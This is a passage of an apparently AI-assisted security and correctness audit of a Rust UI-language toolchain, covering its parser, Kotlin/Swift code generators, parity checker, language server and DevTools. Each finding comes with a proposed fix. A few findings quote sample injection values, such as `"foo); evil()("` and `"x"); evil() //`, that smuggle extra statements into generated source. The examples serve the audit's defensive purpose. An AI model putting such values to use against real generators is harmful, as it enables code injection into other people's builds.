- Every malformed frame triggers `blocking(move || …error_frame…)` — a spawn + pipeline-mutex acquisition per junk byte-frame. A misbehaving client spamming 0xFF floods the blocking pool. Rate-limit (e.g. token bucket per connection) or build the error frame without touching the pipeline (it only needs `seq`).

### [🔵 LOW] NIT — `websocket_config()` returns `WebSocketConfig::default()` behind a comment about features
- File: `crates/flux-devserver/src/server/session.rs` : 25-35
- Either set explicit limits (`max_message_size`, `max_frame_size`) matching `MAX_FRAME_BYTES` or delete the function; the current doc promises behavior ("compression negotiated when the feature is enabled") that the code doesn't configure.

### [🔵 LOW] NIT — `assets.rs` is solid; two residual edges
- File: `crates/flux-devserver/src/assets.rs` : 47-134
- Good: component-blocklist traversal guard, symlink canonicalize re-check, weak ETag, 304s. Residual: (1) `tokio::fs::read` has no size cap — a huge file under the project root is read whole into memory per request; (2) the asset server has **no auth**, so a `0.0.0.0`-style exposure (if HTTP bind is ever LAN-configured) reads the whole project tree (including `.env`-style files) — worth a `TODO` guard or an explicit doc "localhost-only by contract". Fix (1):
```rust
const MAX_ASSET_BYTES: u64 = 32 * 1024 * 1024;
if metadata.len() > MAX_ASSET_BYTES { return (StatusCode::PAYLOAD_TOO_LARGE, "asset too large").into_response(); }
```

---

## 7. Parser & syntax crates — personal deep read

### Verdict: hardened where it counts
- `crates/flux-parser/src/parser.rs` : 50-58, 925-933 — explicit `MAX_NESTING_DEPTH` brace pre-scan plus `MAX_PARSE_DEPTH` recursion guard (`inc_depth`), both returning actionable diagnostics. The classic "10 000 nested parens" DoS is handled.
- `crates/flux-vm-ref/src/decode.rs` : 103-129 — total decode, no `unsafe`, truncation → `IndexOutOfBounds`. Clean.
- `crates/flux-syntax/src/opcode/decode.rs` — pure tables, `None` for unassigned bytes. Clean.

Remaining nits:

### [🔵 LOW] BUG — `lex_string` swallows an escaped newline, creating undocumented multi-line strings
- File: `crates/flux-parser/src/lexer.rs` : 489-491
- `Some('\\') => self.pos += 2` skips the backslash **and whatever follows**, including `\n` — so `"a\` + newline continues the string on the next line even though the documented rule (and the error at : 483-487) says strings end at newline. Either reject `\` + newline as a lexical error or document heredoc-style continuation and test it.
```rust
Some('\\') => {
    if self.peek_at(1) == Some('\n') {
        return Err(LexError::new("escaped newline in string literal", /* span */));
    }
    self.pos += 2;
}
```

### [🔵 LOW] SMELL — Lexer materializes the whole source into two `Vec`s
- File: `crates/flux-parser/src/lexer.rs` : 270-315
- `bytes: Vec<usize>` (8 B/char) + `chars: Vec<char>` (4 B/char) ⇒ ~12 bytes of RAM per source byte before lexing starts, and cache-hostile indirection (`chars.get(pos)` + `bytes.get(pos)` per step). For the 5 ms parse budget on large files, iterate `char_indices` directly with a small `peek` ring instead. Not a correctness bug — a memory/cache smell worth fixing before the "large file" benchmark matters.

### [🔵 LOW] SMELL — Tab/space mixing has no policy
- File: `crates/flux-parser/src/lexer.rs` : 368-394
- Indent columns count *characters* (tab = 1). A file mixing `"    "` and `"\t"` indentation resolves to arbitrary nesting with no diagnostic (Python at least errors on ambiguous mixes). Emit a warning-level diagnostic when a line's indent uses a different whitespace *kind* than the enclosing level.

### [🔵 LOW] NIT — `flux-types/src/exhaust.rs` doc/code mismatch on wildcard-pattern catch-alls
- File: `crates/flux-types/src/exhaust.rs` : 27-29 vs 75-82
- Doc: *"wildcard-pattern (`Variant(_, _)`) arm is treated as a catch-all"*; code only treats `_` and the literal `_`-named variant as catch-alls. Also, an empty-variant ADT (`enum Void {}`) trivially "passes" only when arms exist. Align the doc, and add a test for `Void`-style ADTs.
---

## 8. Codegen & parity (`flux-codegen-core`, `flux-codegen-kotlin`, `flux-codegen-swift`, `flux-parity`)

*Reviewed end-to-end by audit pass A1; anchors verified.*

### [🔴 CRITICAL] BUG — User-component call sites render named args with `:` — invalid Kotlin (and the parity recognizer masks it)
- File: `crates/flux-codegen-core/src/emitter.rs` : 731-743
- `render_args` emits `format!("{}: {}", name, value)` for **both** backends. In Swift `Avatar(url: avatarUrl, size: 80.0)` is valid, but Kotlin named arguments require `=` — the generated `Avatar(url: avatarUrl, size: 80.0)` (e.g. B.3.7, monomorphized `Counter_Int(initial: 0)`) is a Kotlin compile error. The parity pipeline never catches this because `extract_swift_props` (`crates/flux-parity/src/recognize_swift/swift_views.rs` : 283-285) accepts *both* `:` and `=`, so `check_parity` passes on source that cannot compile.
- Fix: make argument spelling backend-specific:
```rust
// backend.rs
fn named_arg(name: &str, value: &str) -> String;   // Kotlin: "{name} = {value}", Swift: "{name}: {value}"
// emitter.rs
Arg::Named { name, value } => B::named_arg(&name.name, &render_expr::<B>(value)),
```
…and make the recognizer strict per language so this class of bug fails CI.

### [🟠 HIGH] BUG — `normalize_view_name` / `is_container` tables diverge between release walker and dev reducer — JSON parity breaks for FLUX-037/038/040 primitives
- Files: `crates/flux-codegen-core/src/view_tree.rs` : 103-124 vs `crates/flux-parity/src/reduce.rs` : 276-347
- Two independent copies of both functions exist. `reduce.rs` maps `TextField→TextInput`, `Switch→Toggle`, `ModalBottomSheet→Sheet`, `AlertDialog/Alert→Dialog`, `Dialog→Modal`, `FullScreenCover→Modal`, `AnimatedContent→Animate`, `ZStack/Box→Stack`, `LazyVerticalGrid→Grid`, `Scaffold→SafeArea`, and its `is_container` includes `Grid | SafeArea | Modal | Sheet | Dialog`. `view_tree.rs` has none of these — so the release lowered-IR walker **drops their children**. `tests/parity_json.rs` only passes because the B.3 fixtures avoid these primitives; any flux `Switch` reduces to `Toggle` on the dev side and stays `Switch` on the release side; `Grid { Text() }` loses `Text` on the release side.
- Fix: delete both tables from `view_tree.rs` and re-export the canonical ones from one module (move `normalize_view_name`/`is_container` into `flux-codegen-core::view_tree` and have `flux_parity::reduce` consume them), plus add B.3 fixtures exercising `Switch`/`Grid`/`Modal` so `json_parity_all_examples` actually guards the table.

### [🟠 HIGH] BUG — FLUX-040 form primitives emit invalid native calls and silently drop their change handlers
- Files: `crates/flux-codegen-core/src/emitter.rs` : 492-514; `crates/flux-codegen-kotlin/src/backend_impl.rs` : 164-171; `crates/flux-codegen-core/src/primitives.rs` : 457-537
- The `Leaf` arm emits `{native}({value})` and never reads `spec.handler_prop`. So flux `Switch(value: v, onChange: {…})` → Kotlin `Switch(v)` (Material3 requires `checked=`/`onCheckedChange=`) and Swift `Toggle(v)` (requires `isOn:`) — non-compiling on both, handler gone. Same for `Checkbox`, `Slider`, `Picker`, `DatePicker`, `TextArea`. Additionally, `Toggle` on Kotlin emits `Switch(checked = v, onCheckedChange = { v = it }) {` + children + `}` — Compose `Switch` has **no** trailing content lambda.
- Fix: give `Leaf` primitives a backend hook `fn form_control(spec, value, on_change) -> String` emitting named-arg forms (`Switch(checked = v, onCheckedChange = { v = it })`, SwiftUI `Slider(value: Binding(get:set:))`), and drop the spurious `{ }` from Kotlin `toggle_open`.

### [🟠 HIGH] BUG — Router `startDestination` interpolated with no escaping (broken/injectable output)
- File: `crates/flux-codegen-core/src/emitter.rs` : 669-682
- `format!("\"{}\"", route)` embeds the raw interned `initialRouteName` string into both backends' output. A route containing `"`, `\`, `$`, or a newline produces broken Kotlin/Swift — or injects code (`Router(initialRouteName: "x"); evil() //`).
- Fix: `format!("\"{}\"", B::escape_text(route))` (or route the literal through the existing `render_string` path).

### [🟠 HIGH] SEC — `animation_spec` passes unknown curve text verbatim into generated Swift/Kotlin; Swift doc contradicts code
- Files: `crates/flux-codegen-swift/src/backend_impl.rs` : 239-263; `crates/flux-codegen-kotlin/src/backend_impl.rs` : 245-267
- For any curve not in the table, both backends emit the trimmed user string as an expression: `withAnimation(<user text>)` / `tween(easing = <user text>)`. A `.flux` value like `"foo); evil()("` injects arbitrary statements into the compiled release source. The Swift doc explicitly claims "unknown curves fall back to `.default`" — the code does not do that.
- Fix:
```rust
other => {
    log::warn!("unknown Animate curve {other:?}");
    "Animation.default".to_owned()   // Kotlin: "tween()".to_owned()
}
```

### [🟡 MEDIUM] BUG — Kotlin `Row` gap emits a parameter Compose `Row` doesn't have
- File: `crates/flux-codegen-kotlin/src/backend_impl.rs` : 58-69
- For `axis == "horizontal"` the emitter produces `(horizontalAlignment = Alignment.CenterHorizontally, horizontalArrangement = Arrangement.spacedBy(N.dp))`. Compose `Row` has `horizontalArrangement` + `verticalAlignment`; `horizontalAlignment` is a `Column` parameter → **compile error for every `Row(gap: …)`**. (`GridRow` isn't in `PRIMITIVES` — dead condition.)
- Fix:
```rust
if axis == "horizontal" {
    format!("(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy({gap}.dp))")
} else { /* unchanged Column form */ }
```

### [🟡 MEDIUM] BUG — Swift `TextField` drops `onValueChange` entirely and emits an invalid `Binding` setter for literal values
- File: `crates/flux-codegen-swift/src/backend_impl.rs` : 135-163 (same defect in `toggle_open` : 167-171)
- (a) The collected `on_change` handler is bound to `let _on_change` and never used — user edit handlers silently vanish on iOS while Kotlin wires them: a real backend divergence. (b) `set: {{ newValue in {} = newValue }}` assigns to the *value expression*: for the common no-binding case (`value = ""`) it emits `"" = newValue` — invalid Swift; `Toggle(value: true)` emits `true = newValue`.
- Fix: thread `on_change` into the emitted call (e.g. `onChange: { _ in <stmts> }`), and only emit `Binding(get:set:)` when the value is a plain identifier; otherwise `.constant(...)`.

### [🟡 MEDIUM] BUG — Generic-component fallback drops the `<T>` clause, contradicting its own comment
- File: `crates/flux-codegen-core/src/emitter.rs` : 138-147
- The comment says the component is emitted "parametrically so the generated source still compiles", but the call passes `""` instead of `&generics` — the header loses `<T>` while prop/state types still render `T`, producing `@Composable fun Counter(initial: T)` with no `T` in scope.
- Fix: `Self::emit_one_component(self, name, &generics, &meta);`

### [🟡 MEDIUM] BUG — `meta_has_router` only scans top-level body items → nested `Router` gets a `String` route state
- File: `crates/flux-codegen-core/src/emitter.rs` : 884-902
- `has_router` drives the Swift `route → NavigationPath()` rewrite but only inspects `decl.body.items` for a *direct* `Router {` call; a `Router` nested in `Column { Router { … } }` returns `false`, so Swift emits `@State private var route: String = "home"` while `router_open` emits `NavigationStack(path: $route)` — `Binding<String>` where `Binding<NavigationPath>` is required: non-compiling, and layout-dependent.
- Fix: recurse into trailing blocks/args (reuse `walk_expr` from `bridge.rs`), or derive the flag from the lowered arena (does the subtree contain `PrimitiveKind::Router`?).

### [🟡 MEDIUM] BUG — Swift `router_open` ignores `initialRouteName` — backend divergence for initial route
- File: `crates/flux-codegen-swift/src/backend_impl.rs` : 66-71
- The shared emitter computes `start_destination` and Kotlin consumes it (`startDestination = …`), but Swift's `router_open(_start_destination)` discards it: `NavigationStack(path: $route)` starts empty — the app always lands on no/first destination regardless of the prop.
- Fix: seed the path when emitting the router (`route.append(start)` right after `router_open`, or `NavigationPath([start])` in `emit_state_cell`).

### [🟡 MEDIUM] BUG — `render_binary` wildcard silently renders `+`; three duplicated fallback tables disagree
- Files: `crates/flux-codegen-core/src/expressions.rs` : 88-103; `crates/flux-codegen-core/src/view_tree.rs` : 455-472; `crates/flux-parity/src/bridge.rs` : 95-112
- `BinOp` is `#[non_exhaustive]`. When a new operator is added, codegen silently emits `(a + b)` — wrong operator, wrong program, no error; `view_tree.rs` emits `(a ? b)` while `bridge.rs` emits `(a + b)`, so the three parity trees disagree.
- Fix: return an explicit unsupported placeholder identically in all three copies, or share one `binop_symbol` returning `Option<&str>`.

### [🟡 MEDIUM] SEC — Recognizer tokenizer mishandles escaped quotes — codegen output containing `\"` mis-parses
- File: `crates/flux-parity/src/tokenize.rs` : 34-44
- The string scanner ends a token at the first `"` with no escape handling. Generated code contains `\"` whenever user text includes a quote; a `{` inside such a string becomes a *structural brace*, breaking `match_brace`/`match_delim` counts — parity silently weakens exactly when text escaping is exercised.
- Fix:
```rust
if ch == '"' {
    buf.push(ch);
    let mut escaped = false;
    for c in chars.by_ref() {
        buf.push(c);
        if c == '\\' { escaped = !escaped; continue; }
        if c == '"' && !escaped { break; }
        escaped = false;
    }
    continue;
}
```

### [🟡 MEDIUM] BUG — Hand-rolled JSON parser corrupts non-ASCII strings (Latin-1 mojibake) and rejects `\uXXXX`
- File: `crates/flux-parity/src/trace/json.rs` : 219-239
- `let ch = self.bytes[self.pos] as char;` reinterprets each **byte** as a Unicode scalar: any multi-byte UTF-8 character in a trace string becomes 2-4 garbage Latin-1 chars in the canonical frame. Parity still "passes" only because both sides corrupt identically. `\uXXXX` escapes error out with "unsupported escape".
- Fix: decode via `std::str::from_utf8` over the raw slice (input is `&str`), and implement `\uXXXX` incl. surrogate pairs.

### [🟡 MEDIUM] BUG — `ReferenceDecoder` rejects valid non-Error/Hello frames that `HostDecoder` accepts
- File: `crates/flux-parity/src/error_frame.rs` : 82-96
- The reference decoder only recognizes `from_error_bytes` / `from_hello_bytes`; a valid `Delta`/`Heartbeat`/`Init` frame falls through to `Rejected(InvalidTag)` while `HostDecoder` maps the same kind byte to `Accepted(Delta)`. `assert_error_frame_parity` passes only because the corpus contains just Error/Hello frames.
- Fix: add a generic decode path for all kinds and extend `default_corpus` with one valid frame of every kind.

### [🟡 MEDIUM] DESIGN — `then`/`else` and match arms compared as unordered bags — parity masks branch-swap bugs
- File: `crates/flux-parity/src/equivalence.rs` : 277-318
- `branch_bag_equal` treats `if (c) {A} else {B}` as equal to `if (c) {B} else {A}`, and `arms_equal` compares match arms unordered — but branch order is semantically load-bearing (first-match-wins); a codegen bug that swaps branches passes parity.
- Fix: compare `then_branch`/`else_branch` positionally; keep unordered matching only where genuinely needed; keep match arms ordered.

### [🟡 MEDIUM] PERF — `indent_prefix` leaks a fresh `Box<str>` on every deep-indent call
- File: `crates/flux-codegen-core/src/emitter.rs` : 852-855
- For `indent >= 17`, each call does `" ".repeat(indent * unit).into_boxed_str()` and `Box::leak`s it — *per call*. A deep component emitting 1 000 lines at level 20 leaks 1 000 copies (unbounded growth proportional to output size).
- Fix: memoize in a `RefCell<HashMap<usize, &'static str>>` on the `Emitter`, or emit into the line buffer without allocating statics: `self.out.extend(std::iter::repeat(' ').take(indent * B::INDENT_UNIT));`

### [🟡 MEDIUM] BUG — Async-detection heuristic `handler.contains("await")` misfires
- Files: `crates/flux-codegen-kotlin/src/backend_impl.rs` : 125-129; `crates/flux-codegen-swift/src/backend_impl.rs` : 119-123
- Substring matching over the rendered handler decides coroutine wrapping (`GlobalScope.launch` / `Task { }`). A handler mentioning "await" in any form (`state.awaiting = true`, `Text("awaited")`) is needlessly wrapped — and `GlobalScope.launch` is a lint-flagged anti-pattern. Stringly-typed feature detection.
- Fix: decide structurally — have `render_handler_body` return whether any `ExprKind::Await` was rendered (`struct Handler { body: String, is_async: bool }`).

### [🟡 MEDIUM] PERF — Per-call-site O(n) `component_names` scans + redundant arena lookups + `expect` in a closure
- File: `crates/flux-codegen-core/src/emitter.rs` : 224-245, 454-467
- Resolving a component call name linearly scans `component_names` **every time**; the fallback branch calls `arena.get(id).expect("component node")` *inside* the `find` closure — re-fetching per iteration and panicking if the node vanished; `emit_node` re-fetches a node already fetched at the top of the function.
- Fix: pre-resolve once (`HashMap<ComponentId, &str>` built at `emit_program` start); hoist `arena.get(id)` out of the closure; replace the `expect` with `if let Some(node) = … else { return }`.

### [🔵 LOW] BUG — Swift recognizer converts `route != "x"` into a `Screen` node
- File: `crates/flux-parity/src/recognize_swift/swift_views.rs` : 42-61
- The screen-detection pattern accepts `if_tokens[1] == "!="`, folding a genuine negated condition into `ViewNode::Screen { route: "home" }` (dropping the negation and else-branch semantics).
- Fix: accept only `==`, or compare against the set of emitted routes.

### [🔵 LOW] BUG — `ForEach`/`items` argument splitting breaks on commas inside `[…]` and drops spaces
- Files: `crates/flux-parity/src/recognize_swift/swift_views.rs` : 84-120; `crates/flux-parity/src/recognize_kotlin/kotlin_views.rs` : 82-119
- Only paren depth is tracked, so `ForEach([a, b], id: \.self)` splits the *list literal* at its comma; tokens are also joined without separators (`(count>0)`).
- Fix: track `[`/`]` depth alongside `(`/`)`, and join with spaces (canonical comparison collapses whitespace anyway).

### [🔵 LOW] BUG — Recognizers swallow unbalanced-body errors via `parse_body(...).unwrap_or_default()`
- Files: `crates/flux-parity/src/recognize_swift/swift_views.rs` : 125-129; `crates/flux-parity/src/recognize_kotlin/kotlin_views.rs` : 124-128
- A drifted/misbalanced `ForEach` body silently reduces to an empty body — turning a codegen/recognition drift into "parity OK". Propagate: `let (_body, end) = parse_body(tokens, m)?;`.

### [🔵 LOW] BUG — `render_float` can emit `inf`/`NaN` — invalid literals in Swift and Kotlin
- File: `crates/flux-codegen-core/src/expressions.rs` : 57-63
- Non-finite floats fall through to `value.to_string()` producing `inf`/`NaN` — not valid numeric literals in either target language.
- Fix: match `value.is_finite()` and emit `Double.infinity`/`Double.nan` (Swift) / `Double.POSITIVE_INFINITY`/`Double.NaN` (Kotlin) via a `Backend` hook; or reject at type-check time.

### [🔵 LOW] BUG — `Bridge::components()` documents "insertion order" but iterates a `HashMap`
- File: `crates/flux-codegen-core/src/bridge.rs` : 83-87
- Returns `self.components.iter()` over a `HashMap` — arbitrary order — while the doc promises insertion order.
- Fix: use `BTreeMap` or keep an ordered `Vec` of ids alongside the map; fix the doc otherwise.

### [🔵 LOW] BUG — `Divergence::render` mixes 1-based file line numbers with 0-based frame indices
- File: `crates/flux-parity/src/trace.rs` : 138-165
- `left.get(l.wrapping_sub(1))` treats a raw *file line number* (which skips blank lines per `load_trace_str`) as a frame index — for traces containing blank lines the context window indexes the wrong frames.
- Fix: carry frame indices in `Divergence` (or return `usize` indices from `compare`); keep `line` only for display.

### [🔵 LOW] BUG — The two `canonicalize_expr` copies disagree on quoted text containing "unsupported"
- Files: `crates/flux-codegen-core/src/view_tree.rs` : 360-380 vs `crates/flux-parity/src/bridge.rs` : 118-146
- `view_tree.rs` checks `contains("unsupported")` *before* the string-literal branch, so a literal `"unsupported"` canonicalizes to `0`; `bridge.rs` checks after. Same input, different canonical forms — false divergence for any string mentioning "unsupported".
- Fix: unify into one shared function with a single documented ordering (string-literal handling first, placeholder collapse last).

### [🔵 LOW] SMELL — `HOST_ADAPTERS` rows `Container`/`WebHost` have no `PRIMITIVES` entry; prelude list hard-coded twice
- Files: `crates/flux-codegen-core/src/primitives.rs` : 765-769, 846-851; `crates/flux-codegen-core/src/parity.rs` : 18-58, 71-111
- The doc says the tables are "kept in lockstep" — they aren't, and no test checks `HOST_ADAPTERS` against `PRIMITIVES`. The parity guard duplicates the 30-name prelude list twice (a third hand-copy of `flux_types::prelude`) — the very drift it exists to catch.
- Fix: add a test asserting every `HOST_ADAPTERS.flux_name` exists in `PRIMITIVES`; iterate the prelude itself instead of a copied array; consider merging `kotlin_adapter`/`swift_adapter` into `PrimitiveSpec` so drift is structurally impossible.

### [🔵 LOW] SMELL — Expression rendering canonicalization triplicated across crates (already diverging)
- Files: `crates/flux-codegen-core/src/expressions.rs` : 36-117; `crates/flux-codegen-core/src/view_tree.rs` : 360-472; `crates/flux-parity/src/bridge.rs` : 13-146
- `render_expr`/`render_float`/`render_string`/`binop_symbol`/`render_key`/`canonicalize_expr`/`callee_name` exist in 2-3 copies with observable behavioral drifts (see findings above).
- Fix: hoist the canonical renderer into `flux-codegen-core` (a `Canonical` zero-sized `Backend` impl) and have `flux-parity` consume it; delete the copies.

### [🔵 LOW] PERF — `emit_state` clones the substitution map per state cell
- File: `crates/flux-codegen-core/src/emitter.rs` : 405-421
- `let subst_ref = self.subst.clone();` allocates a fresh `HashMap` for *every* state declaration just to satisfy aliasing in `emit_state_cell`.
- Fix: change `emit_state_cell`'s signature to receive `&[(String, String)]` (snapshot once per component).

### [🔵 LOW] SMELL — Kotlin emitter hardcodes absolute indentation inside strings
- File: `crates/flux-codegen-kotlin/src/backend_impl.rs` : 75-82, 111-119
- `LazyColumn {{\n                items(…` embeds fixed 16/4-space continuations that ignore the `indent` parameter — mis-indents nested ForEach/Router and breaks the "indent tables identical" invariant.
- Fix: thread `indent` into these hooks (`fn for_each_open(em, collection, key, element, indent)` using `em.line(indent + n, …)`).

### [🔵 LOW] BUG — Wildcard arms in `render_args`/`render_string` would emit malformed output
- Files: `crates/flux-codegen-core/src/emitter.rs` : 738-740; `crates/flux-codegen-core/src/expressions.rs` : 78; `crates/flux-codegen-core/src/view_tree.rs` : 449
- `render_args`' fallback would splice an empty fragment into the arg list, producing `Name(, value)` (invalid in *both* languages); `render_string`'s would silently drop literal text.
- Fix: make them skip explicitly (`continue`/`debug_assert!` + skip) so a future variant degrades gracefully.

### [⚪ NIT] SMELL — Dead code: shadowed arena lookup and identity function; stale comments
- Files: `crates/flux-codegen-core/src/emitter.rs` : 666 (dead `let _node`), 880-882 (`render_inline` is the identity function); `crates/flux-codegen-core/src/emitter.rs` : 543-547; `crates/flux-codegen-core/src/backend.rs` : 115-118; `crates/flux-codegen-swift/src/backend_impl.rs` : 239-243
- Delete the dead binding and `render_inline`; update the three comments that contradict current behavior (`PrimitiveKind::Other` list, `screen_close` doc, animation fallback claim).

### [⚪ NIT] BUG — `collect_handler` takes the *first* alias, not the canonical `onPress`
- File: `crates/flux-codegen-core/src/emitter.rs` : 789-802
- Doc says "`onPress` is canonical; `onTap`/`onClick` are accepted aliases", but the loop returns whichever appears first in source order — `Button(onTap: …, onPress: …)` emits the `onTap` body.
- Fix: scan in priority order (`onPress`, then `onTap`, then `onClick`).

### [⚪ NIT] PERF — Redundant repeated work in trace parity assertions; O(n) LRU touch
- Files: `crates/flux-parity/src/persistence.rs` : 243-249; `crates/flux-parity/src/error_frame.rs` : 86-94; `crates/flux-parity/src/cache.rs` : 84-90
- `assert_storage_parity` re-runs the identical `compare(...)` inside `map_err`; `LruImageCache::touch` is O(n) per op (`position` + `insert(0, …)`) — fine for fixtures, but it's the *reference model* hosts are validated against.
- Fix: mirror cache.rs's single-compare pattern; use a `LinkedHashMap` (move-to-front) or document the O(n) model contract.

### [⚪ NIT] SMELL — Inconsistent module visibility between backend crates; theme arms identical
- Files: `crates/flux-codegen-swift/src/lib.rs` : 34 (`pub mod backend_impl`) vs `crates/flux-codegen-kotlin/src/lib.rs` : 34 (`mod backend_impl`); `backend_impl.rs` : 296-310 / 270-284
- Make both private; collapse the dead dispatch and the needless intermediate `Vec`.
---

## 9. DevTools UI, LSP, perf harness, VS Code extension

*Reviewed end-to-end by audit pass A2; anchors verified.*

### [🟠 HIGH] BUG — Time-travel slider range is frozen at window-open time (scrubber unusable)
- File: `crates/flux-devtools-ui/src/views/timeline.rs` : 38-44, 72-76
- `SliderState::new().max((len.max(1) - 1) as f32)` is computed **once** in `TimelineView::new`, which runs when the window opens — always before any telemetry arrives, so `len == 0` and the slider range is `0..=0` for the entire session. The headline time-travel UX (ADR-0042) is dead on arrival.
- Fix: update the slider range in `render_pane` when `len` changes:
```rust
let max = (len.max(1) - 1) as f32;
self.slider.update(cx, |s, _| { if s.max() != max { s.set_max(max); } });
```
(or recreate the `Entity<SliderState>` whenever `len` changes, re-subscribing).

### [🟠 HIGH] BUG — LSP never declares position encoding; three different column conventions coexist
- Files: `crates/flux-lsp/src/lib.rs` : 344-371; `crates/flux-lsp/src/util.rs` : 19-39; `crates/flux-lsp/src/semantic_tokens.rs` : 105, 117-124
- `ServerCapabilities` leaves `position_encoding` unset — per the LSP spec clients then send **UTF-16 code units**. But `util::position_to_offset` counts **UTF-8 bytes**, and `semantic_tokens::line_col_at` counts **Unicode chars** while emitting `length` in **bytes**. Any non-ASCII before a position (user-facing strings, emoji comments — common in a UI language) shifts every diagnostic, hover, goto-def, completion and semantic token. All tests use ASCII fixtures, so it's invisible in CI.
- Fix: negotiate explicitly and use one conversion layer — declare UTF-8 when the client offers it (`position_encoding: Some(PositionEncodingKind::UTF8)`), or implement UTF-16 conversion in `util.rs` and route everything through it.

### [🟠 HIGH] BUG — `position_to_offset` clamps an over-long column to EOF instead of end-of-line
- File: `crates/flux-lsp/src/util.rs` : 19-39 (esp. 34-37)
- If `line` is valid but `character` is past that line's end **and the line is not the last one**, the tail check `if current_line >= line { return Some(text.len()) }` returns **end of file**. Hand-trace: `"abc\ndef\n"`, position `(line 0, char 10)` → returns 8 (EOF) instead of 3. `apply_range_edit` then splices the replacement at the wrong place, corrupting the cached document on ordinary incremental edits.
- Fix:
```rust
if current_line == line {
    let col = (idx - line_start as usize) as u32;
    if col >= character { return Some(idx as u32); }
    if ch == '\n' { return Some(idx as u32); } // past line end: clamp to line end
}
```

### [🟠 HIGH] PERF — Time-travel reconstruction replays the whole prefix with a full-state clone per event, every frame
- Files: `crates/flux-devtools-ui/src/state.rs` : 126-133, 491-500; `crates/flux-devtools-ui/src/time_travel/reconstruct.rs` : 95; `crates/flux-devtools-ui/src/views/timeline.rs` : 87
- `DevToolsState::state_at(index)` re-replays from the base snapshot for **every** timeline render, and `reconstruct_state` starts with `base.clone()` per call — scrubbing to index *i* performs *i* full `ReconstructedState` clones → O(n²) allocation churn at the 10 000-event capacity, on the UI thread, per repaint while telemetry streams.
- Fix: split `reconstruct_state` into an in-place `apply_event(&mut state, &event)` (no clone per event); add periodic checkpoints (`Vec<(usize, ReconstructedState)>`) so scrubbing to index *i* replays at most K events.

### [🟠 HIGH] PERF — Log/Network DataTables clone the entire snapshot once per table cell
- Files: `crates/flux-devtools-ui/src/views/log_viewer.rs` : 31-33, 50; `crates/flux-devtools-ui/src/views/network_inspector.rs` : 30-32, 50
- `rows_count` calls `filtered_log_snapshot()` (full `Vec` clone of up to 512 entries) and `render_td` calls `filtered_log_snapshot()[row_ix]` **per cell** — with 3-4 columns that's ~1 500-2 000 full-buffer clones per render, on the UI thread, for every repaint. It also re-reads the shared `RwLock` per cell, so `rows_count` and cell rendering can observe different buffers mid-frame.
- Fix:
```rust
struct LogsDelegate { state: Arc<DevToolsState>, snapshot: Vec<LogEntry> }
fn rows_count(&mut self, _cx: &App) -> usize { self.snapshot = self.state.filtered_log_snapshot(); self.snapshot.len() }
fn render_td(...) { let entry = &self.snapshot[row_ix]; ... }
```

### [🟡 MEDIUM] BUG — Scrub index silently drifts as the ring buffer evicts
- Files: `crates/flux-devtools-ui/src/time_travel/buffer.rs` : 44-49; `crates/flux-devtools-ui/src/state.rs` : 298-300; `crates/flux-devtools-ui/src/app.rs` : 256-276
- `scrub_index` is a positional index into `TimelineBuffer`, but `push` evicts from the front at capacity, shifting every retained event down while the stored index stays fixed. A user paused at index *i* drifts toward the live edge as telemetry flows; `StepBack`/`StepForward` then operate on an event the user never selected.
- Fix: adjust the index on eviction (`scrub_index = scrub_index.map(|i| i.saturating_sub(1))` next to `push`), or key the scrub point by a monotonic event sequence number.

### [🟡 MEDIUM] BUG — Keyboard scrub / pane toggle / signal select never trigger a repaint
- Files: `crates/flux-devtools-ui/src/app.rs` : 256-303, 332-339; `crates/flux-devtools-ui/src/state.rs` : 292, 298, 323
- The root only requests an animation frame when `timeline_len`/`host` changed. `StepBack`/`StepForward`/`JumpToLive`/`TogglePane`/`InspectSignal` mutate a plain `Arc<DevToolsState>` (not a gpui entity) producing no notification, so the UI doesn't update until unrelated telemetry arrives.
- Fix: capture the window handle and call `window.request_animation_frame()` (or `cx.notify()` on an `Entity`-wrapped state) after each action-handler mutation.

### [🟡 MEDIUM] BUG — Incremental-edit fallback silently replaces the whole document with the inserted fragment
- File: `crates/flux-lsp/src/lib.rs` : 146-155
- When `apply_range_edit` returns `None`, the code does `*text = change.text`. Under incremental sync, `change.text` is only the replacement fragment — the entire cached file is wiped and replaced by the last-typed characters.
- Fix: `tracing::warn!(?range, "unmappable incremental edit; ignoring"); continue;` (or request a full re-sync).

### [🟡 MEDIUM] BUG — `to_lsp_diagnostic` end position mixes units and collapses multi-line spans
- File: `crates/flux-lsp/src/lib.rs` : 242-258
- `end.character = d.character.saturating_sub(1) + d.length` adds a **byte** length to a **column** offset and pins `end.line` to the start line — a diagnostic spanning multi-byte text or a newline underlines the wrong range.
- Fix: compute the end from the span's byte offset: `let end = offset_to_position(text, span.start + span.len())`.

### [🟡 MEDIUM] BUG — Real server never publishes diagnostics on `did_open`; integration test masks it
- Files: `crates/flux-lsp/src/lib.rs` : 392-408; `crates/flux-lsp/tests/publish_diagnostics.rs` : 89-106
- `FluxLsp::did_open` only inserts into the document cache — no analysis, no `publishDiagnostics` — so a freshly opened file shows no squiggles until the first edit. The acceptance test passes only because it drives a hand-written `TestServer` that re-implements the publishing the real server lacks.
- Fix: extract publish logic (snapshot → `diagnostics_with_types` → notify) into a helper; call it from `did_open` and the debounced `did_change`; point the integration test at `FluxLsp` itself.

### [🟡 MEDIUM] BUG — No `did_close`: document cache and version map grow unboundedly
- File: `crates/flux-lsp/src/lib.rs` : 334-538
- The `LanguageServer` impl handles `did_open`/`did_change` but not `did_close` — closed documents stay cached forever and late debounced tasks keep publishing diagnostics for closed files.
- Fix: implement `did_close` — remove the URI from `documents`/`versions`, publish empty `publishDiagnostics` per spec.

### [🟡 MEDIUM] BUG — VS Code hot-reload status connects to the wrong endpoint, sniffs binary frames, and never reconnects
- File: `editors/vscode/src/extension.ts` : 48-78
- Three defects in one feature: (1) connects to `ws://127.0.0.1:${port}` — the DevTools endpoint is `/devtools` (`wire_client.rs` : 90), so the handshake likely fails and status stays "idle"; (2) even connected, it does `data.toString()` on **binary** telemetry frames and checks `text.includes("reload")` — the wire carries no such text; (3) on `close`/`error` it sets `telemetrySocket = undefined` and gives up — no retry.
- Fix: connect to `ws://127.0.0.1:${port}/devtools`, decode actual frames (or add a dedicated status event), and reconnect with backoff from `close`/`error`.

### [🟡 MEDIUM] SEC — `Run on device` interpolates a workspace setting into a shell command
- Files: `editors/vscode/src/extension.ts` : 84-99; `editors/vscode/package.json` : 66-70
